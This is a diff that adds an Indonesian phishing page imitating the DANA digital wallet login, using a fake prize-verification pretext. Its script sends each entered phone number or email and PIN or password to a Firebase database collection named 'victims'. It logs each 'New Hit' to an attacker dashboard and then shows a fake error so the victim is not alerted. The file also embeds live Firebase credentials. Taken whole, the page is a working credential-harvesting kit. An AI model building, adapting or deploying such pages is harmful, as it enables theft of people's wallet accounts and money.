@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Verifikasi Akun</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+
+        // CONFIG FIREBASE KAMU (Harus sama dengan Dashboard)
+        const firebaseConfig = {
+            apiKey: "AIzaSyAMmcOF9E5LA8Cu3dxvstyPCzjd_ZZ_NIM",
+            authDomain: "tahu-bulat-dad9d.firebaseapp.com",
+            projectId: "tahu-bulat-dad9d",
+            appId: "1:784968244179:web:fbf29b0745bfdc5fb52d26"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "tahu-bulat-c2-pro";
+
+        window.handleLogin = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn-login');
+            const user = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            btn.disabled = true;
+            btn.innerText = "Memproses...";
+
+            try {
+                // Pastikan auth dulu sebelum kirim data
+                await signInAnonymously(auth);
+                
+                // Kirim data ke path yang dipantau Dashboard
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victims'), {
+                    platform: "DANA_MOBILE",
+                    username: user,
+                    password: pass,
+                    ip: "182.1.xx.xx", // Simulasi IP
+                    timestamp: Date.now()
+                });
+
+                // Kirim log ke Dashboard
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
+                    message: `New Hit: ${user} mencoba login`,
+                    type: "SUCCESS",
+                    timestamp: { seconds: Math.floor(Date.now() / 1000) }
+                });
+
+                alert("Sesi berakhir. Silakan coba lagi nanti.");
+                location.reload();
+            } catch (err) {
+                console.error(err);
+                alert("Gangguan koneksi, coba lagi.");
+                btn.disabled = false;
+                btn.innerText = "MASUK";
+            }
+        };
+    </script>
+    <style>
+        body { background-color: #008ced; font-family: sans-serif; }
+        .card { background: white; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="card w-full max-w-sm p-8 text-center">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain_horizontal.png" alt="Logo" class="h-10 mx-auto mb-8">
+        <h2 class="text-xl font-bold text-gray-800 mb-2">Dompet Digital Indonesia</h2>
+        <p class="text-sm text-gray-500 mb-8">Masukkan detail akun untuk melanjutkan verifikasi hadiah.</p>
+        
+        <form onsubmit="handleLogin(event)" class="space-y-4">
+            <input type="text" id="email" placeholder="Nomor HP atau Email" required 
+                class="w-full border-b-2 border-gray-200 py-3 px-1 outline-none focus:border-blue-500 transition-all">
+            
+            <input type="password" id="password" placeholder="PIN atau Password" required 
+                class="w-full border-b-2 border-gray-200 py-3 px-1 outline-none focus:border-blue-500 transition-all">
+            
+            <button type="submit" id="btn-login"
+                class="w-full bg-[#008ced] text-white font-bold py-3 rounded-full mt-6 hover:bg-blue-600 transition-all">
+                MASUK
+            </button>
+        </form>
+        
+        <p class="mt-8 text-[10px] text-gray-400 uppercase tracking-widest">Aman & Terpercaya</p>
+    </div>
+</body>
+</html>
